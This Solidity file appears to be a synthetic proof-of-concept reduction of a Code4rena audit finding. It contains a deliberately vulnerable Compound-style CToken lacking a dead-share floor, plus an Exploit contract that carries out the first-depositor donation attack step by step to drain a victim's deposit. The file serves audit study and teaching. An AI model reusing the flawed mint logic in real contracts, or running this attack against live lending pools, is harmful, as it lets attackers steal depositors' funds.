// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Rubicon — [H-17] First depositor bug on unmodified Compound fork
    (Code4rena 2023-04-rubicon; #48956)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: CToken mintFresh mints shares as mintAmount / exchangeRate with no
    dead-share floor. Attacker mints 1 wei of cToken, donates a large amount of
    underlying, then victim mint rounds down to 0 shares; attacker redeems the
    entire pool including victim funds.
    Vulnerable mintTokens = div_(actualMintAmount, exchangeRate) preserved @>. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal Compound CToken / BathToken with first-depositor inflation.
contract CToken {
    MockERC20 public underlying;
    uint256 public totalSupply;
    mapping(address => uint256) public accountTokens;
    // initialExchangeRateMantissa = 2e26 → 1 underlying wei mints 0 shares until enough;
    // we use 1e18 scale: exchangeRate = cash * 1e18 / totalSupply (or initial).
    uint256 public constant initialExchangeRateMantissa = 2e26; // matches finding PoC

    constructor(MockERC20 u) {
        underlying = u;
    }

    function balanceOf(address a) external view returns (uint256) {
        return accountTokens[a];
    }

    function getCash() public view returns (uint256) {
        return underlying.balanceOf(address(this));
    }

    function exchangeRateStored() public view returns (uint256) {
        if (totalSupply == 0) return initialExchangeRateMantissa;
        // exchangeRate = cash * 1e18 / totalSupply (Compound Exp scale simplified to 1e18)
        // Finding uses Compound Exp: mintTokens = mintAmount / exchangeRate
        // with exchangeRate mantissa 2e26 → mint(2e8) => 1 share.
        return (getCash() * 1e18) / totalSupply;
    }

    function exchangeRateStoredInternal() internal view returns (uint256) {
        if (totalSupply == 0) return initialExchangeRateMantissa;
        // Compound: exchangeRate = cash * 1e18 / totalSupply, but mint uses Exp.div
        // with mantissa. For fidelity with the finding PoC:
        // mintTokens = actualMintAmount * 1e18 / exchangeRateMantissa
        // when totalSupply==0, rate=2e26 → mint(2e8) = 1 share.
        return (getCash() * 1e18) / totalSupply;
    }

    /// @dev mint — reduced mintFresh. Vulnerable line preserved.
    function mint(uint256 mintAmount) external returns (uint256) {
        uint256 exchangeRateMantissa =
            totalSupply == 0 ? initialExchangeRateMantissa : (getCash() * 1e18) / totalSupply;

        // doTransferIn
        underlying.transferFrom(msg.sender, address(this), mintAmount);
        uint256 actualMintAmount = mintAmount;

        // Compound Exp: mintTokens = actualMintAmount * 1e18 / exchangeRateMantissa
        // (div_ of Exp). With initial 2e26: mint(2e8) → 1 token.
        // @> VULN: no dead-share floor; when rate is inflated mintTokens rounds to 0
        uint256 mintTokens = (actualMintAmount * 1e18) / exchangeRateMantissa; // @> VULN
        // FIX: if (totalSupply == 0) { totalSupply = 1000; accountTokens[address(0)] = 1000; mintTokens -= 1000; }

        totalSupply = totalSupply + mintTokens;
        accountTokens[msg.sender] = accountTokens[msg.sender] + mintTokens;
        return 0; // NO_ERROR
    }

    function redeem(uint256 redeemTokens) external returns (uint256) {
        require(accountTokens[msg.sender] >= redeemTokens, "bal");
        uint256 exchangeRateMantissa = exchangeRateStoredInternal();
        // redeemAmount = redeemTokens * exchangeRate / 1e18
        // When totalSupply is tiny and cash is huge, rate uses cash/supply.
        uint256 redeemAmount = (redeemTokens * getCash()) / totalSupply;
        accountTokens[msg.sender] -= redeemTokens;
        totalSupply -= redeemTokens;
        underlying.transfer(msg.sender, redeemAmount);
        // silence unused
        exchangeRateMantissa;
        return 0;
    }
}

contract Actor {
    CToken public cToken;
    MockERC20 public token;

    constructor(CToken c, MockERC20 t) {
        cToken = c;
        token = t;
    }

    function doMint(uint256 amt) external {
        token.approve(address(cToken), type(uint256).max);
        cToken.mint(amt);
    }

    function doDonate(uint256 amt) external {
        token.transfer(address(cToken), amt);
    }

    function doRedeem(uint256 shares) external {
        cToken.redeem(shares);
    }
}

contract Exploit {
    MockERC20 public token; // CREATE nonce 1
    CToken public cToken; // CREATE nonce 2 — vulnerable
    Actor public alice; // CREATE nonce 3 — attacker
    Actor public bob; // CREATE nonce 4 — victim

    uint256 public aliceStolen;

    constructor() {
        token = new MockERC20("TEST", "TEST");
        cToken = new CToken(token);
        alice = new Actor(cToken, token);
        bob = new Actor(cToken, token);
        // Fund actors (mirrors adminMint + transfer in the finding PoC)
        token.mint(address(alice), 200e18);
        token.mint(address(bob), 100e18);
    }

    function run() external {
        // Baseline
        require(cToken.totalSupply() == 0, "supply");
        require(cToken.exchangeRateStored() == 2e26, "rate");

        // 1. Alice mints 2e8 underlying → 1 cToken (rate 2e26)
        alice.doMint(2e8);
        require(cToken.balanceOf(address(alice)) == 1, "alice shares");
        require(cToken.totalSupply() == 1, "ts");

        // 2. Alice donates 100e18 underlying, inflating exchange rate
        alice.doDonate(100e18);
        require(cToken.getCash() == 100e18 + 2e8, "cash");

        // 3. Bob deposits 100e18 → rounds down to 0 shares (attacked)
        bob.doMint(100e18);
        require(cToken.balanceOf(address(bob)) == 0, "bob should get 0"); // @ harm
        require(cToken.totalSupply() == 1, "still 1 share");

        // 4. Alice redeems her 1 share and drains Bob's deposit
        uint256 aliceBefore = token.balanceOf(address(alice));
        alice.doRedeem(1);
        aliceStolen = token.balanceOf(address(alice)) - aliceBefore;
        // Alice had ~100e18 left after mint+donate (200e18 - 2e8 - 100e18);
        // redeem pulls full cash ≈ 200e18 + 2e8 - residual.
        // Net: alice ends with ~300e18 total (stole Bob's 100e18).
        require(token.balanceOf(address(alice)) >= 299e18, "alice did not steal bob funds");
        require(token.balanceOf(address(bob)) == 0, "bob drained");
        require(cToken.totalSupply() == 0, "empty");
    }
}
